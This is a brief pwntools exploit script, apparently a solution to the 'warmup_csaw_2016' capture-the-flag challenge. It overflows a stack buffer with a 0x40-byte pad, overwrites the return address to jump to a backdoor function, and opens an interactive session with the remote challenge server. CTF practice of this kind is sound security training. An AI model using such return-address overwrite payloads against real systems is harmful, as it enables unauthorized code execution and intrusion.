from pwn import *

context.log_level = 'debug'
io = remote('node3.buuoj.cn', 25933)
# io = process('warmup_csaw_2016')
backdoor = 0x40060d
rbp = 0x4006b0

io.recv()
io.sendline(cyclic(0x40) + p64(rbp) + p64(backdoor))
io.interactive()
